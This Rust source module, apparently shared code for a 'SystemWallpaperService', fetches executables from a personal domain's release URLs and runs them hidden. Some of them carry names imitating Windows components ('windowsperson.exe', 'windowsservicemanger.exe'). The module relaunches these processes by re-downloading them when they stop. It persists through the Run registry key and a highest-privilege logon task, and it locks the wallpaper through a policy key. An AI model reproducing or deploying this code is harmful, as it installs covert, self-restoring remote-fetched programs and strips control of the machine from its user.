#![allow(unused)]
use anyhow::{anyhow, Result};
use log::{error, info, warn};
use simplelog::{Config, LevelFilter, WriteLogger};
use std::fs::OpenOptions;
use std::path::{Path, PathBuf};
use std::process::Command;
use sysinfo::System;
use winreg::enums::*;
use winreg::RegKey;

pub const APP_DIR_NAME: &str = "SystemWallpaperService";
pub const DAILY_EXE: &str = "daily.exe";
pub const PERSON_EXE: &str = "windowsperson.exe";
pub const MANAGER_EXE: &str = "windowsservicemanger.exe";
pub const CONFIG_URL: &str = "https://git.zxymiku.top/https://github.com/zxymiku/wallpaper/releases/download/config/config.json";
pub const DAILY_DOWNLOAD_URL: &str = "https://git.zxymiku.top/https://github.com/zxymiku/wallpaper/releases/download/config/daily.exe";
pub const PERSON_DOWNLOAD_URL: &str = "https://git.zxymiku.top/https://github.com/zxymiku/wallpaper/releases/download/config/windowsperson.exe";
pub const MANAGER_DOWNLOAD_URL: &str = "https://git.zxymiku.top/https://github.com/zxymiku/wallpaper/releases/download/config/windowsservicemanger.exe";
const MAX_LOG_SIZE_BYTES: u64 = 10 * 1024 * 1024;
pub fn init_logging(log_file_name: &str) -> Result<()> {
    let app_dir = get_app_dir()?;
    let log_path = app_dir.join(log_file_name);

    if log_path.exists() {
        if let Ok(metadata) = std::fs::metadata(&log_path) {
            if metadata.len() > MAX_LOG_SIZE_BYTES {
                if let Err(e) = std::fs::File::create(&log_path) {
                    eprintln!("无法清空日志文件: {}", e);
                }
            }
        }
    }

    let log_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path)?;

    WriteLogger::init(LevelFilter::Info, Config::default(), log_file)?;
    info!("log started");
    Ok(())
}

pub fn get_app_dir() -> Result<PathBuf> {
    let local_data_dir = dirs::data_local_dir().ok_or_else(|| anyhow!("无法获取 AppData/Local 目录"))?;
    let app_dir = local_data_dir.join(APP_DIR_NAME);
    if !app_dir.exists() {
        std::fs::create_dir_all(&app_dir)?;
    }
    Ok(app_dir)
}

pub fn is_process_running(name: &str) -> bool {
    let mut s = System::new_all();
    s.refresh_processes();
    let processes: Vec<_> = s.processes_by_name(name).collect();
    !processes.is_empty()
}

pub async fn download_file(url: &str, dest_path: &Path) -> Result<()> {
    let response = reqwest::get(url).await?;
    if !response.status().is_success() {
        return Err(anyhow!("HTTP request failed with status: {}", response.status()));
    }
    let mut file = std::fs::File::create(dest_path)?;
    let content = response.bytes().await?;
    std::io::copy(&mut content.as_ref(), &mut file)?;
    Ok(())
}

pub fn run_program_hidden(path: &Path) -> Result<()> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    Command::new(path)
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()?;
    Ok(())
}

pub async fn guard_process(exe_name: &str, download_url: &str) -> Result<()> {
    if !is_process_running(exe_name) {
        warn!("task{} no start", exe_name);
        let app_dir = get_app_dir()?;
        let exe_path = app_dir.join(exe_name);

        if let Err(e) = download_file(download_url, &exe_path).await {
            if !exe_path.exists() {
                 error!("download warn{} notin{}", exe_name, e);
                 return Err(e.into());
            }
        }
        if exe_path.exists() {
             if let Err(e) = run_program_hidden(&exe_path) {
                error!("cloudnt{} warn {}", exe_name, e);
             } else {
                info!("{} success start", exe_name);
             }
        }
    }
    Ok(())
}

pub fn set_autostart(app_name: &str, app_path: &Path) -> Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");
    let (key, _) = hkcu.create_subkey(&path)?;
    key.set_value(app_name, &app_path.to_str().unwrap_or_default())?;
    Ok(())
}

pub fn create_scheduled_task(task_name: &str, app_path: &str) -> Result<()> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    Command::new("schtasks")
        .args(["/delete", "/tn", task_name, "/f"])
        .creation_flags(CREATE_NO_WINDOW)
        .status()?;

    let result = Command::new("schtasks")
        .args([
            "/create",
            "/tn", task_name,
            "/tr", &format!("'{}'", app_path),
            "/sc", "onlogon",
            "/rl", "highest",
            "/f",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()?;

    if !result.status.success() {
        let stderr = String::from_utf8_lossy(&result.stderr);
        return Err(anyhow!("创建任务计划失败: {}", stderr));
    }

    Ok(())
}

pub fn lock_wallpaper_policy() -> Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let policies_path = Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Policies")
        .join("ActiveDesktop");

    let (key, _) = hkcu.create_subkey(&policies_path)?;
    key.set_value("NoChangingWallPaper", &1u32)?;
    refresh_policies();
    Ok(())
}

pub fn set_wallpaper(path: &Path) -> Result<()> {
    let path_str = path.to_str().ok_or_else(|| anyhow!("warnpath"))?;
    let path_wide: Vec<u16> = path_str.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        use winapi::um::winuser::{SystemParametersInfoW, SPIF_SENDCHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER};
        let result = SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            path_wide.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        );
        if result == 0 {
            return Err(anyhow!("(SystemParametersInfoW)"));
        }
    }
    Ok(())
}
fn refresh_policies() {
     use std::os::windows::process::CommandExt;
     const CREATE_NO_WINDOW: u32 = 0x08000000;
     let _ = Command::new("gpupdate").arg("/force").creation_flags(CREATE_NO_WINDOW).status();
}
